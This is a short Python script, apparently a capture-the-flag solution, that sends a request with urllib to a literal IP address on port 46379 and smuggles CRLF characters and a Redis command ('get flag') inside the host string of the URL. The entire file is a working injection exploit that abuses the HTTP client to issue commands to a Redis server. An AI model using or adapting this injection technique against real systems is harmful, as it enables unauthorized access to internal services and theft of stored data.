import urllib.request

host = "114.55.65.251:46379?\r\n*2\r\n$3\r\nget\r\n$4\r\nflag"

url = "http://{host}/".format(host=host)

resp = urllib.request.urlopen(url)

print(resp.read())
